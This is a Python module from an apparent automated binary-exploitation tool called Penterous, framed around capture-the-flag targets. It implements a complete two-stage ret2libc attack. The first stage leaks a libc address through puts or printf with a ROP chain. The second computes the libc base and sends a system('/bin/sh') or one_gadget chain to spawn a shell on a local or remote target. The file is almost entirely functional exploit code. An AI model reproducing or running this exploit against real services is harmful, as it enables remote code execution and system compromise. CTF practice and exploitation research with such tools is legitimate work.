"""
Penterous — leak + ret2libc strategy: ASLR on, libc provided.
Phase 1: leak libc address via puts/printf
Phase 2: calculate libc base, send system(/bin/sh) chain
"""
import struct
import time
from typing import Optional
from strategies.base import ExploitStrategy, ExploitResult, _ensure_flag_txt
from utils.logger import info, success, warning, error
from utils.pwntools_wrap import PWNTOOLS_AVAILABLE


class LeakRet2LibcStrategy(ExploitStrategy):
    """
    Two-stage exploit:
    1) Leak libc address via puts(GOT['puts']) → return to main
    2) Calculate libc base, send system('/bin/sh')
    """

    def execute(self, mode: str = 'local', host: str = None, port: int = None) -> ExploitResult:
        start = time.time()
        strategy = 'leak_ret2libc'

        if not self.binary.libc:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "libc not provided — use --libc", mode=mode)

        # Determine best leak function
        leak_func = self._pick_leak_func()
        info(f"Leak function: {leak_func}()")

        phase1_payload = self.rop.build_leak_chain(self.offset, leak_func)
        if not phase1_payload:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "Cannot build leak chain (missing PLT/GOT)", mode=mode)

        info(f"Phase 1 payload: {len(phase1_payload)} bytes")

        # Connect
        tube = self._get_tube(mode, host, port)
        if tube is None:
            return self._make_result(False, None, strategy, phase1_payload, b'', start,
                                     "Failed to create tube", mode=mode)

        all_output = b''
        libc_base = 0

        try:
            # Receive initial prompt
            try:
                tube.recvuntil(b':', timeout=2)
            except Exception:
                try:
                    tube.recv(timeout=1)
                except Exception:
                    pass

            # Send phase 1: leak
            info("Sending leak payload (phase 1)...")
            tube.sendline(phase1_payload)

            # Receive leaked address
            leaked_raw = b''
            try:
                leaked_raw = tube.recvline(timeout=5)
                all_output += leaked_raw
            except Exception:
                try:
                    leaked_raw = tube.recv(8, timeout=5)
                    all_output += leaked_raw
                except Exception:
                    pass

            leaked = self._parse_leak(leaked_raw, leak_func)

            if not leaked:
                error(f"Failed to parse leaked address from: {leaked_raw!r}")
                try:
                    tube.close()
                except Exception:
                    pass
                return self._make_result(False, None, strategy, phase1_payload, all_output, start,
                                         "Leak parsing failed", mode=mode)

            info(f"Leaked {leak_func} address: 0x{leaked:x}")

            # Calculate libc base
            try:
                symbol_offset = self.binary.libc.symbols[leak_func]
                libc_base = leaked - symbol_offset
                info(f"libc base: 0x{libc_base:x}")
            except KeyError:
                error(f"{leak_func} not in libc symbols")
                try:
                    tube.close()
                except Exception:
                    pass
                return self._make_result(False, None, strategy, phase1_payload, all_output, start,
                                         f"{leak_func} not in libc", mode=mode, libc_base=0)

            # Calculate addresses
            try:
                system_addr = libc_base + self.binary.libc.symbols['system']
                bin_sh_addr = libc_base + next(self.binary.libc.search(b'/bin/sh'))
            except Exception as e:
                try:
                    tube.close()
                except Exception:
                    pass
                return self._make_result(False, None, strategy, phase1_payload, all_output, start,
                                         f"Cannot find system/bin/sh: {e}", mode=mode, libc_base=libc_base)

            success(f"system()  @ 0x{system_addr:x}")
            success(f"/bin/sh   @ 0x{bin_sh_addr:x}")

            # Try one_gadget first
            one_gadget_offset = self._try_one_gadget(libc_base)
            if one_gadget_offset:
                phase2_payload = b'A' * self.offset + self._pack(libc_base + one_gadget_offset)
                info(f"Using one_gadget @ 0x{libc_base + one_gadget_offset:x}")
            else:
                phase2_payload = self.rop.build_system_chain(
                    self.offset, system_addr, bin_sh_addr, libc_base=libc_base
                )

            info(f"Phase 2 payload: {len(phase2_payload)} bytes (ROP chain)")

            # Receive prompt for phase 2
            try:
                tube.recvuntil(b':', timeout=3)
            except Exception:
                try:
                    tube.recv(timeout=1)
                except Exception:
                    pass

            # Send phase 2
            info("Sending ROP chain (phase 2)...")
            tube.sendline(phase2_payload)
            all_output += phase2_payload

            output = b''
            flag = self.hunter.interactive_flag_capture(tube)
            if flag:
                try:
                    tube.close()
                except Exception:
                    pass
                return self._make_result(True, flag, strategy, phase2_payload, flag.encode(),
                                         start, libc_base=libc_base, mode=mode,
                                         host=host or '', port=port or 0)

            try:
                output = tube.recvall(timeout=5)
            except Exception:
                try:
                    output = tube.recv(4096, timeout=5)
                except Exception:
                    pass

            all_output += output
            flag = self.hunter.hunt(output)

        except Exception as e:
            error(f"Exploit error: {e}")
            if self.binary.bits:
                import traceback
                if self.binary.verbose if hasattr(self.binary, 'verbose') else False:
                    traceback.print_exc()
        finally:
            try:
                tube.close()
            except Exception:
                pass

        return self._make_result(
            success_=flag is not None,
            flag=flag,
            strategy=strategy,
            payload=phase1_payload + phase2_payload if 'phase2_payload' in dir() else phase1_payload,
            output=all_output,
            start_time=start,
            libc_base=libc_base,
            mode=mode,
            host=host or '',
            port=port or 0,
        )

    def _pick_leak_func(self) -> str:
        if not self.binary.elf:
            return 'puts'
        try:
            plt = self.binary.elf.plt
            for func in ['puts', 'printf', 'write', 'gets', 'read']:
                if func in plt:
                    return func
        except Exception:
            pass
        return 'puts'

    def _parse_leak(self, raw: bytes, func: str) -> Optional[int]:
        """Parse leaked address from process output."""
        raw = raw.strip(b'\n').strip()
        if not raw:
            return None

        # puts/write output: raw little-endian bytes
        if len(raw) >= 6:
            try:
                if self.binary.bits == 64:
                    padded = raw[:8].ljust(8, b'\x00')
                    val = struct.unpack('<Q', padded)[0]
                else:
                    padded = raw[:4].ljust(4, b'\x00')
                    val = struct.unpack('<I', padded)[0]
                if 0x7f0000000000 <= val <= 0x7fffffffffff:
                    return val
            except Exception:
                pass

        # printf hex output
        import re
        m = re.search(r'0x([0-9a-f]{8,16})', raw.decode('latin-1'))
        if m:
            return int(m.group(1), 16)

        return None

    def _try_one_gadget(self, libc_base: int) -> Optional[int]:
        from utils.libc_db import find_one_gadget
        if self.binary.libc:
            offsets = find_one_gadget(self.binary.libc.path)
            if offsets:
                info(f"one_gadget found: {[hex(o) for o in offsets]}")
                return offsets[0]
        return None

    def _pack(self, val: int) -> bytes:
        if self.binary.bits == 64:
            return struct.pack('<Q', val & 0xFFFFFFFFFFFFFFFF)
        else:
            return struct.pack('<I', val & 0xFFFFFFFF)
